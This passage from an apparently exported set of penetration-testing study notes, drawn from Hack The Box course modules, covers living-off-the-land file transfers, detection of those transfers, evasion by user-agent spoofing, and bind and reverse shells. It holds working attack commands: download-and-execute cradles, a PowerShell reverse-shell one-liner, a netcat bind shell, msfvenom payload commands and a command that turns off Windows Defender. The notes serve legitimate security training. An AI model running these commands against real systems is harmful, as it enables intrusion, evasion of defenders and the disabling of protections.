(UNKNOWN) [192.168.49.1] 53819\nPOST / HTTP/1.1\nCache-Control: no-cache\nConnection: Keep-Alive\nPragma: no-cache\nContent-Type: application/json\nUser-Agent: Mozilla/4.0 (compatible; Win32; NDES client 10.0.19041.1466/vb_release_svc_prod1)\nContent-Length: 92\nHost: 192.168.49.128:8000\n\n; for 16-bit app support\n[fonts]\n[extensions]\n[mci extensions]\n[files]\n[Mail]\nMAPI=1\n```\n\nIf you get an error when running `certreq.exe`, the version you are using may not contain the `-Post` parameter. You can download an updated version [here](https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe) and try again.\n\n### GTFOBins\n\nTo search for the download and upload function in [GTFOBins for Linux Binaries](https://gtfobins.github.io/), we can use `+file download` or `+file upload`.\n\n![GTFObins page listing Unix binaries with functions like file upload and download, and associated ATT&CK techniques.](https://academy.hackthebox.com/storage/modules/24/gtfobins_download.jpg)\n\nLet's use [OpenSSL](https://www.openssl.org/). It's frequently installed and often included in other software distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files \"nc style.\"\n\nWe need to create a certificate and start a server in our Pwnbox.\n\n#### Create Certificate in our Pwnbox\n\nLiving off The Land\n\n```shell-session\ndrxh3kr@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem\n\nGenerating a RSA private key\n.......................................................................................................+++++\n................+++++\nwriting new private key to 'key.pem'\n-----\nYou are about to be asked to enter information that will be incorporated\ninto your certificate request.\nWhat you are about to enter is what is called a Distinguished Name or a DN.\nThere are quite a few fields but you can leave some blank\nFor some fields there will be a default value,\nIf you enter '.', the field will be left blank.\n-----\nCountry Name (2 letter code) [AU]:\nState or Province Name (full name) [Some-State]:\nLocality Name (eg, city) []:\nOrganization Name (eg, company) [Internet Widgits Pty Ltd]:\nOrganizational Unit Name (eg, section) []:\nCommon Name (e.g. server FQDN or YOUR name) []:\nEmail Address []:\n```\n\n#### Stand up the Server in our Pwnbox\n\nLiving off The Land\n\n```shell-session\ndrxh3kr@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh\n```\n\nNext, with the server running, we need to download the file from the compromised machine.\n\n#### Download File from the Compromised Machine\n\nLiving off The Land\n\n```shell-session\ndrxh3kr@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh\n```\n\n---\n\n## Other Common Living off the Land tools\n\n### Bitsadmin Download function\n\nThe [Background Intelligent Transfer Service (BITS)](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) can be used to download files from HTTP sites and SMB shares. It \"intelligently\" checks host and network utilization into account to minimize the impact on a user's foreground work.\n\n#### File Download with Bitsadmin\n\nLiving off The Land\n\n```powershell-session\nPS C:\\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\\Users\\htb-student\\Desktop\\nc.exe\n```\n\nPowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers.\n\n#### Download\n\nLiving off The Land\n\n```powershell-session\nPS C:\\htb> Import-Module bitstransfer; Start-BitsTransfer -Source \"http://10.10.10.32:8000/nc.exe\" -Destination \"C:\\Windows\\Temp\\nc.exe\"\n```\n\n---\n\n### Certutil\n\nCasey Smith ([@subTee](https://twitter.com/subtee?lang=en)) found that Certutil can be used to download arbitrary files. It is available in all Windows versions and has been a popular file transfer technique, serving as a defacto `wget` for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage.\n\n#### Download a File with Certutil\n\nLiving off The Land\n\n```cmd-session\nC:\\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe\n```\n\n---\n\n## Extra Practice\n\nIt's worth perusing the LOLBAS and GTFOBins websites and experimenting with as many file transfer methods as possible. The more obscure, the better. You never know when you'll need one of these binaries during an assessment, and it'll save time if you already have detailed notes on multiple options. Some of the binaries that can be leveraged for file transfers may surprise you.\n\nIn the final two sections, we'll touch upon detection considerations regarding file transfers and some steps we can step to evade detection if the scope of our assessment calls for evasive testing.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/06-File Transfers/10-Detection",
    "path": "02_CPTS/06-File Transfers/10-Detection.md",
    "title": "10 Detection",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Command-line detection based on blacklisting is straightforward to bypass, even using simple case obfuscation. However, although the process of whitelisting all command lines in a particular envir...",
    "category": "02_CPTS",
    "content": "\n---\n\nCommand-line detection based on blacklisting is straightforward to bypass, even using simple case obfuscation. However, although the process of whitelisting all command lines in a particular environment is initially time-consuming, it is very robust and allows for quick detection and alerting on any unusual command lines.\n\nMost client-server protocols require the client and server to negotiate how content will be delivered before exchanging information. This is common with the `HTTP` protocol. There is a need for interoperability amongst different web servers and web browser types to ensure that users have the same experience no matter their browser. HTTP clients are most readily recognized by their user agent string, which the server uses to identify which `HTTP` client is connecting to it, for example, Firefox, Chrome, etc.\n\nUser agents are not only used to identify web browsers, but anything acting as an `HTTP` client and connecting to a web server via `HTTP` can have a user agent string (i.e., `cURL`, a custom `Python` script, or common tools such as `sqlmap`, or `Nmap`).\n\nOrganizations can take some steps to identify potential user agent strings by first building a list of known legitimate user agent strings, user agents used by default operating system processes, common user agents used by update services such as Windows Update, and antivirus updates, etc. These can be fed into a SIEM tool used for threat hunting to filter out legitimate traffic and focus on anomalies that may indicate suspicious behavior. Any suspicious-looking user agent strings can then be further investigated to determine whether they were used to perform malicious actions. This [website](http://useragentstring.com/index.php) is handy for identifying common user agent strings. A list of user agent strings is available [here](http://useragentstring.com/pages/useragentstring.php).\n\nMalicious file transfers can also be detected by their user agents. The following user agents/headers were observed from common `HTTP` transfer techniques (tested on Windows 10, version 10.0.14393, with PowerShell 5).\n\n#### Invoke-WebRequest - Client\n\nDetection\n\n```powershell-session\nPS C:\\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile \"C:\\Users\\Public\\nc.exe\" \nPS C:\\htb> Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile \"C:\\Users\\Public\\nc.exe\"\n```\n\n#### Invoke-WebRequest - Server\n\nDetection\n\n```shell-session\nGET /nc.exe HTTP/1.1\nUser-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0\n```\n\n#### WinHttpRequest - Client\n\nDetection\n\n```powershell-session\nPS C:\\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;\nPS C:\\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);\nPS C:\\htb> $h.send();\nPS C:\\htb> iex $h.ResponseText\n```\n\n#### WinHttpRequest - Server\n\nDetection\n\n```shell-session\nGET /nc.exe HTTP/1.1\nConnection: Keep-Alive\nAccept: */*\nUser-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)\n```\n\n#### Msxml2 - Client\n\nDetection\n\n```powershell-session\nPS C:\\htb> $h=New-Object -ComObject Msxml2.XMLHTTP;\nPS C:\\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);\nPS C:\\htb> $h.send();\nPS C:\\htb> iex $h.responseText\n```\n\n#### Msxml2 - Server\n\nDetection\n\n```shell-session\nGET /nc.exe HTTP/1.1\nAccept: */*\nAccept-Language: en-us\nUA-CPU: AMD64\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)\n```\n\n#### Certutil - Client\n\nDetection\n\n```cmd-session\nC:\\htb> certutil -urlcache -split -f http://10.10.10.32/nc.exe \nC:\\htb> certutil -verifyctl -split -f http://10.10.10.32/nc.exe\n```\n\n#### Certutil - Server\n\nDetection\n\n```shell-session\nGET /nc.exe HTTP/1.1\nCache-Control: no-cache\nConnection: Keep-Alive\nPragma: no-cache\nAccept: */*\nUser-Agent: Microsoft-CryptoAPI/10.0\n```\n\n#### BITS - Client\n\nDetection\n\n```powershell-session\nPS C:\\htb> Import-Module bitstransfer;\nPS C:\\htb> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\\t;\nPS C:\\htb> $r=gc $env:temp\\t;\nPS C:\\htb> rm $env:temp\\t; \nPS C:\\htb> iex $r\n```\n\n#### BITS - Server\n\nDetection\n\n```shell-session\nHEAD /nc.exe HTTP/1.1\nConnection: Keep-Alive\nAccept: */*\nAccept-Encoding: identity\nUser-Agent: Microsoft BITS/7.8\n```\n\nThis section just scratches the surface on detecting malicious file transfers. It would be an excellent start for any organization to create a whitelist of allowed binaries or a blacklist of binaries known to be used for malicious purposes. Furthermore, hunting for anomalous user agent strings can be an excellent way to catch an attack in progress. We will cover threat hunting and detection techniques in-depth in later modules.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/06-File Transfers/11-Evading Detection",
    "path": "02_CPTS/06-File Transfers/11-Evading Detection.md",
    "title": "11 Evading Detection",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Changing User Agent If diligent administrators or defenders have blacklisted any of these User Agents, Invoke-WebRequest contains a UserAgent parameter, which allows for changing the default user ...",
    "category": "02_CPTS",
    "content": "\n---\n\n## Changing User Agent\n\nIf diligent administrators or defenders have blacklisted any of these User Agents, [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.1) contains a UserAgent parameter, which allows for changing the default user agent to one emulating Internet Explorer, Firefox, Chrome, Opera, or Safari. For example, if Chrome is used internally, setting this User Agent may make the request seem legitimate.\n\n#### Listing out User Agents\n\nEvading Detection\n\n```powershell-session\nPS C:\\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label=\"User Agent\";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl\n\nName       : InternetExplorer\nUser Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)\n\nName       : FireFox\nUser Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0\n\nName       : Chrome\nUser Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0\n             Safari/534.6\n\nName       : Opera\nUser Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1\n\nName       : Safari\nUser Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0\n             Safari/533.16\n```\n\nInvoking Invoke-WebRequest to download nc.exe using a Chrome User Agent:\n\n#### Request with Chrome User Agent\n\nEvading Detection\n\n```powershell-session\nPS C:\\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome\nPS C:\\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile \"C:\\Users\\Public\\nc.exe\"\n```\n\nEvading Detection\n\n```shell-session\ndrxh3kr@htb[/htb]$ nc -lvnp 80\n\nlistening on [any] 80 ...\nconnect to [10.10.10.32] from (UNKNOWN) [10.10.10.132] 51313\nGET /nc.exe HTTP/1.1\nUser-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6\n(KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6\nHost: 10.10.10.32\nConnection: Keep-Alive\n```\n\n---\n\n## LOLBAS / GTFOBins\n\nApplication whitelisting may prevent you from using PowerShell or Netcat, and command-line logging may alert defenders to your presence. In this case, an option may be to use a \"LOLBIN\" (living off the land binary), alternatively also known as \"misplaced trust binaries\". An example LOLBIN is the Intel Graphics Driver for Windows 10 (GfxDownloadWrapper.exe), installed on some systems and contains functionality to download configuration files periodically. This download functionality can be invoked as follows:\n\n#### Transferring File with GfxDownloadWrapper.exe\n\nEvading Detection\n\n```powershell-session\nPS C:\\htb> GfxDownloadWrapper.exe \"http://10.10.10.132/mimikatz.exe\" \"C:\\Temp\\nc.exe\"\n```\n\nSuch a binary might be permitted to run by application whitelisting and be excluded from alerting. Other, more commonly available binaries are also available, and it is worth checking the [LOLBAS](https://lolbas-project.github.io/) project to find a suitable \"file download\" binary that exists in your environment. Linux's equivalent is the [GTFOBins](https://gtfobins.github.io/) project and is definitely also worth checking out. As of the time of writing, the GTFOBins project provides useful information on nearly 40 commonly installed binaries that can be used to perform file transfers.\n\n---\n\n## Closing Thoughts\n\nAs we've seen in this module, there are many ways to transfer files to and from our attack host between Windows and Linux systems. It's worth practicing as many of these as possible throughout the modules in the Penetration Tester path. Got a web shell on a target? Try downloading a file to the target for additional enumeration using Certutil. Need to download a file off the target? Try an Impacket SMB server or a Python web server with upload capabilities. Refer back to this module periodically and strive to use all the methods taught in some fashion. Also, take some time whenever you're working on a target or lab to search for a LOLBin or GTFOBin that you've never worked with before to accomplish your file transfer goals.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/07-Shells & Payloads/01-Cheet Sheet Shells & Payloads",
    "path": "02_CPTS/07-Shells & Payloads/01-Cheet Sheet Shells & Payloads.md",
    "title": "01 Cheet Sheet Shells & Payloads",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "The cheat sheet is a useful command reference for this module. | Commands                                                                                                                               ...",
    "category": "02_CPTS",
    "content": "The cheat sheet is a useful command reference for this module.\n\n| **Commands| **Description**                                                                                                                                                                                         |\n|| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| `xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol                                                                                                                    |\n| `env`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | Works with many different command language interpreters to discover the environmental variables of a system. This is a great way to find out which shell language is in use                             |\n| `sudo nc -lvnp <port #>`| Starts a `netcat` listener on a specified port                                                                                                                                                          |\n| `nc -nv <ip address of computer with listener started><port being listened on>`                                                                                                                                                                                                                                                                                                                                                                                                                                                               | Connects to a netcat listener at the specified IP address and port                                                                                                                                      |\n| `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \\| /bin/bash -i 2>&1 \\| nc -l 10.129.41.200 7777 > /tmp/f`                                                                                                                                                                                                                                                                                                                                                                                                                                           | Uses netcat to bind a shell (`/bin/bash`) the specified IP address and port. This allows for a shell session to be served remotely to anyone connecting to the computer this command has been issued on |\n| `powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \\| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"` | `Powershell` one-liner used to connect back to a listener that has been started on an attack box                                                                                                        |\n| `Set-MpPreference -DisableRealtimeMonitoring $true`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | Powershell command using to disable real time monitoring in `Windows Defender`                                                                                                                          |\n| `use exploit/windows/smb/psexec`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | Metasploit exploit module that can be used on vulnerable Windows system to establish a shell session utilizing `smb` & `psexec`                                                                         |\n| `shell`| Command used in a meterpreter shell session to drop into a `system shell`                                                                                                                               |\n| `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf`                                                                                                                                                                                                                                                                                                                                                                                                                                                | `MSFvenom` command used to generate a linux-based reverse shell `stageless payload`                                                                                                                     |\n| `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe`                                                                                                                                                                                                                                                                                                                                                                                                                                                  | MSFvenom command used to generate a Windows-based reverse shell stageless payload                                                                                                                       |\n| `msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho`                                                                                                                                                                                                                                                                                                                                                                                                                                              | MSFvenom command used to generate a MacOS-based reverse shell payload                                                                                                                                   |\n| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp`                                                                                                                                                                                                                                                                                                                                                                                                                                            | MSFvenom command used to generate a ASP web reverse shell payload                                                                                                                                       |\n| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp`                                                                                                                                                                                                                                                                                                                                                                                                                                                 | MSFvenom command used to generate a JSP web reverse shell payload                                                                                                                                       |\n| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war`                                                                                                                                                                                                                                                                                                                                                                                                                                                 | MSFvenom command used to generate a WAR java/jsp compatible web reverse shell payload                                                                                                                   |\n| `use auxiliary/scanner/smb/smb_ms17_010`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      | Metasploit exploit module used to check if a host is vulnerable to `ms17_010`                                                                                                                           |\n| `use exploit/windows/smb/ms17_010_psexec`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | Metasploit exploit module used to gain a reverse shell session on a Windows-based system that is vulnerable to ms17_010                                                                                 |\n| `use exploit/linux/http/rconfig_vendors_auth_file_upload_rce`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | Metasploit exploit module that can be used to optain a reverse shell on a vulnerable linux system hosting `rConfig 3.9.6`                                                                               |\n| `python -c 'import pty; pty.spawn(\"/bin/sh\")'`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | Python command used to spawn an `interactive shell` on a linux-based system                                                                                                                             |\n| `/bin/sh -i`| Spawns an interactive shell on a linux-based system                                                                                                                                                     |\n| `perl —e 'exec \"/bin/sh\";'`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   | Uses `perl` to spawn an interactive shell on a linux-based system                                                                                                                                       |\n| `ruby: exec \"/bin/sh\"`| Uses `ruby` to spawn an interactive shell on a linux-based system                                                                                                                                       |\n| `Lua: os.execute('/bin/sh')`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | Uses `Lua` to spawn an interactive shell on a linux-based system                                                                                                                                        |\n| `awk 'BEGIN {system(\"/bin/sh\")}'`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | Uses `awk` command to spawn an interactive shell on a linux-based system                                                                                                                                |\n| `find / -name nameoffile 'exec /bin/awk 'BEGIN {system(\"/bin/sh\")}' \\;`                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | Uses `find` command to spawn an interactive shell on a linux-based system                                                                                                                               |\n| `find . -exec /bin/sh \\; -quit`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | An alternative way to use the `find` command to spawn an interactive shell on a linux-based system                                                                                                      |\n| `vim -c ':!/bin/sh'`| Uses the text-editor `VIM` to spawn an interactive shell. Can be used to escape \"jail-shells\"                                                                                                           |\n| `ls -la <path/to/fileorbinary>`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | Used to `list` files & directories on a linux-based system and shows the permission for each file in the chosen directory. Can be used to look for binaries that we have permission to execute          |\n| `sudo -l`| Displays the commands that the currently logged on user can run as `sudo`                                                                                                                               |\n| `/usr/share/webshells/laudanum`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | Location of `laudanum webshells` on ParrotOS and Pwnbox                                                                                                                                                 |\n| `/usr/share/nishang/Antak-WebShell`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | Location of `Antak-Webshell` on Parrot OS and Pwnbox                                                                                                                                                    |",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/07-Shells & Payloads/02-Shells Jack Us In, Payloads Deliver Us Shells",
    "path": "02_CPTS/07-Shells & Payloads/02-Shells Jack Us In, Payloads Deliver Us Shells.md",
    "title": "02 Shells Jack Us In, Payloads Deliver Us Shells",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- !GIF showcasing a Bash script with matrix effect. A shell is a program that provides a computer user with an interface to input instructions into the system and view text output (Bash, Zsh, cmd, a...",
    "category": "02_CPTS",
    "content": "\n\n---\n\n![GIF showcasing a Bash script with matrix effect.](https://academy.hackthebox.com/storage/modules/115/nonono.txt)\n\nA `shell` is a program that provides a computer user with an interface to input instructions into the system and view text output (Bash, Zsh, cmd, and PowerShell, for example). As penetration testers and information security professionals, a shell is often the result of exploiting a vulnerability or bypassing security measures to gain interactive access to a host. We may have heard or read the following phrases used by people discussing an engagement or a recent practice session:\n\n- `\"I caught a shell.\"`\n- `\"I popped a shell!\"`\n- `\"I dropped into a shell!\"`\n- `\"I'm in!\"`\n\nTypically these phrases translate to the understanding that this person has successfully exploited a vulnerability on a system and has been able to gain remote control of the shell on the target computer's operating system. This is a common goal a penetration tester will have when attempting to access a vulnerable machine. We will notice that most of this module will focus on what comes after enumeration and identification of promising exploits.\n\n---\n\n## Why Get a Shell?\n\nRemember that the shell gives us direct access to the `OS`, `system commands`, and `file system`. So if we gain access, we can start enumerating the system for vectors that may allow us to escalate privileges, pivot, transfer files, and more. If we don't establish a shell session, we are pretty limited on how far we can get on a target machine.\n\nEstablishing a shell also allows us to maintain persistence on the system, giving us more time to work. It can make it easier to use our `attack tools`, `exfiltrate data`, `gather`, `store` and `document` all the details of our attack, as we will soon see in the proceeding demonstrations. It's important to note that establishing a shell almost always means we are accessing the CLI of the OS, and this can make us harder to notice than if we were remotely accessing a graphical shell over [VNC](https://en.wikipedia.org/wiki/Virtual_Network_Computing) or [RDP](https://www.cloudflare.com/learning/access-management/what-is-the-remote-desktop-protocol/). Another significant benefit of becoming skilled with command-line interfaces is that they can be `harder to detect than graphical shells`, `faster to navigate the OS`, and `easier to automate our actions`. We view shells through the lens of the following perspectives throughout this module:\n\n|**Perspective**|**Description**|\n|---|---|\n|`Computing`|The text-based userland environment that is utilized to administer tasks and submit instructions on a PC. Think Bash, Zsh, cmd, and PowerShell.|\n|`Exploitation` `&` `Security`|A shell is often the result of exploiting a vulnerability or bypassing security measures to gain interactive access to a host. An example would be triggering [EternalBlue](https://www.cisecurity.org/wp-content/uploads/2019/01/Security-Primer-EternalBlue.pdf) on a Windows host to gain access to the cmd-prompt on a host remotely.|\n|`Web`|This is a bit different. A web shell is much like a standard shell, except it exploits a vulnerability (often the ability to upload a file or script) that provides the attacker with a way to issue instructions, read and access files, and potentially perform destructive actions to the underlying host. Control of the web shell is often done by calling the script within a browser window.|\n\n---\n\n## Payloads Deliver us Shells\n\nWithin the IT industry as a whole, a `payload` can be defined in a few different ways:\n\n- `Networking`: The encapsulated data portion of a packet traversing modern computer networks.\n- `Basic Computing`: A payload is the portion of an instruction set that defines the action to be taken. Headers and protocol information removed.\n- `Programming`: The data portion referenced or carried by the programming language instruction.\n- `Exploitation & Security`: A payload is `code` crafted with the intent to exploit a vulnerability on a computer system. The term payload can describe various types of malware, including but not limited to ransomware.\n\nIn this module, we will be working with many different types of `payloads` and delivery methods within the context of granting ourselves access to a host and establishing `remote shell` sessions with vulnerable systems.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/07-Shells & Payloads/04-Anatomy of a Shell",
    "path": "02_CPTS/07-Shells & Payloads/04-Anatomy of a Shell.md",
    "title": "04 Anatomy Of A Shell",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Every operating system has a shell, and to interact with it, we must use an application known as a terminal emulator. Here are some of the most common terminal emulators: | Terminal Emulator      ...",
    "category": "02_CPTS",
    "content": "\n\n---\n\nEvery operating system has a shell, and to interact with it, we must use an application known as a `terminal emulator`. Here are some of the most common terminal emulators:\n\n| **Terminal Emulator**                                          | **Operating System**     |\n| :------------------------------------------------------------- | :----------------------- |\n| [Windows Terminal](https://github.com/microsoft/terminal)      | Windows                  |\n| [cmder](https://cmder.app)                                     | Windows                  |\n| [PuTTY](https://www.putty.org)                                 | Windows                  |\n| [kitty](https://sw.kovidgoyal.net/kitty/)                      | Windows, Linux and MacOS |\n| [Alacritty](https://github.com/alacritty/alacritty)            | Windows, Linux and MacOS |\n| [xterm](https://invisible-island.net/xterm/)                   | Linux                    |\n| [GNOME Terminal](https://en.wikipedia.org/wiki/GNOME_Terminal) | Linux                    |\n| [MATE Terminal](https://github.com/mate-desktop/mate-terminal) | Linux                    |\n| [Konsole](https://konsole.kde.org)                             | Linux                    |\n| [Terminal](https://en.wikipedia.org/wiki/Terminal_\\(macOS\\))   | MacOS                    |\n| [iTerm2](https://iterm2.com)                                   | MacOS                    |\n\nThis list is by no means every terminal emulator available, but it does include some noteworthy ones. Also, because many of these tools are open-source, we can install them on different operating systems in ways that may differ from the developers' original intentions. However, that is a project beyond the scope of this module. Selecting the proper terminal emulator for the job is primarily a personal and stylistic preference based on our workflows that develop as we get familiar with our OS of choice. So don't let anyone make you feel bad for selecting one option over the other. The terminal emulator we interact with on targets will essentially be dependant on what exists on the system natively.\n\n---\n\n## Command Language Interpreters\n\nMuch like a human language interpreter will translate spoken or sign language in real-time, a `command language interpreter` is a program working to interpret the instructions provided by the user and issue the tasks to the operating system for processing. So when we discuss command-line interfaces, we know it is a combination of the operating system, terminal emulator application, and the command language interpreter. Many different command language interpreters can be used, some of which are also called `shell scripting languages` or `Command and Scripting interpreters` as defined in the [Execution techniques](https://attack.mitre.org/techniques/T1059/) of the `MITRE ATT&CK Matrix`. We do not need to be software developers to understand these concepts, but the more we know, the more success we can have when attempting to exploit vulnerable systems to gain a shell session.\n\nUnderstanding the command language interpreter in use on any given system will also give us an idea of what commands & scripts we should use. Lets get hands-on with some of these concepts.\n\n---\n\n## Hands-on with Terminal Emulators and Shells\n\nLet's use our `Parrot OS` Pwnbox to further explore the anatomy of a shell. Click the `green` square icon at the top of the screen to open the `MATE` terminal emulator and then type something random and hit enter.\n\n#### Terminal Example\n\n![Terminal showing command not found errors for 'wasdf' and 'meep' on a Parrot OS system.](https://academy.hackthebox.com/storage/modules/115/green-square.png)\n\nAs soon as we selected the icon, it opened the MATE terminal emulator application, which has been pre-configured to use a command language interpreter. In this instance, we are \"clued\" to what language interpreter is in use by seeing the `$` sign. This $ sign is used in Bash, Ksh, POSIX, and many other shell languages to mark the start of the `shell prompt` where the user can begin typing commands and other input. When we typed out our random text and hit enter, our command language interpreter was identified. That is Bash telling us that it did not recognize that command we typed. So here, we can see command language interpreters can have their own set of commands that they recognize. Another way we can identify the language interpreter is by viewing the processes running on the machine. In Linux, we can do this using the following command:\n\n#### Shell Validation From 'ps'\n\nAnatomy of a Shell\n\n```shell-session\ndrxh3kr@htb[/htb]$ ps\n\n    PID TTY          TIME CMD\n   4232 pts/1    00:00:00 bash\n  11435 pts/1    00:00:00 ps\n```\n\nWe can also find out what shell language is in use by viewing the environment variables using the `env` command:\n\n#### Shell Validation Using 'env'\n\nAnatomy of a Shell\n\n```shell-session\ndrxh3kr@htb[/htb]$ env\n\nSHELL=/bin/bash\n```\n\nNow let's select the blue square icon at the top of the screen in Pwnbox.\n\n#### PowerShell vs. Bash\n\n![Terminal showing PowerShell version 7.1.3 on Linux, with a prompt for a new stable release v7.2.0.](https://academy.hackthebox.com/storage/modules/115/blue-box.png)\n\nSelecting this icon also opens the MATE terminal application but uses a different command language interpreter this time around. Compare them as they are placed side-by-side.\n\n- `What differences can we identify?`\n- `Why would we use one over the other on the same system?`\n\nThere are countless differences and customizations we could discover. Try using some commands you know in both and make a mental note of the differences in output and which commands are recognized. One of the main points we can take away from this is a terminal emulator is not tied to one specific language. Actually, the shell language can be changed and customized to suit the sysadmin, developer, or pentester's personal preference, workflow, and technical needs.\n\n`Now for some challenge questions to test our understanding. All answers can be found utilizing Pwnbox.`",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/07-Shells & Payloads/05-Bind Shells",
    "path": "02_CPTS/07-Shells & Payloads/05-Bind Shells.md",
    "title": "05 Bind Shells",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- In many cases, we will be working to establish a shell on a system on a local or remote network. This means we will be looking to use the terminal emulator application on our local attack box to c...",
    "category": "02_CPTS",
    "content": "\n\n---\n\nIn many cases, we will be working to establish a shell on a system on a local or remote network. This means we will be looking to use the terminal emulator application on our local attack box to control the remote system through its shell. This is typically done by using a `Bind` &/or `Reverse` shell.\n\n---\n\n## What Is It?\n\nWith a bind shell, the `target` system has a listener started and awaits a connection from a pentester's system (attack box).\n\n#### Bind Example\n\n![Bind shell setup: Pentester's system 10.10.14.15 connects to target 10.10.14.20:1337 using netcat command.](https://academy.hackthebox.com/storage/modules/115/bindshell.png)\n\nAs seen in the image, we would connect directly with the `IP address` and `port` listening on the target. There can be many challenges associated with getting a shell this way. Here are some to consider:\n\n- There would have to be a listener already started on the target.\n- If there is no listener started, we would need to find a way to make this happen.\n- Admins typically configure strict incoming firewall rules and NAT (with PAT implementation) on the edge of the network (public-facing), so we would need to be on the internal network already.\n- Operating system firewalls (on Windows & Linux) will likely block most incoming connections that aren't associated with trusted network-based applications.\n\nOS firewalls can be troublesome when establishing a shell since we need to consider IP addresses, ports, and the tool in use to get our connection working successfully. In the example above, the application used to start the listener is called [GNU Netcat](https://en.wikipedia.org/wiki/Netcat). `Netcat` (`nc`) is considered our `Swiss-Army Knife` since it can function over TCP, UDP, and Unix sockets. It's capable of using IPv4 & IPv6, opening and listening on sockets, operating as a proxy, and even dealing with text input and output. We would use nc on the attack box as our `client`, and the target would be the `server`.\n\nLet's get a more in-depth understanding of this by practicing with Netcat and establishing a bind shell connection with a host on the same 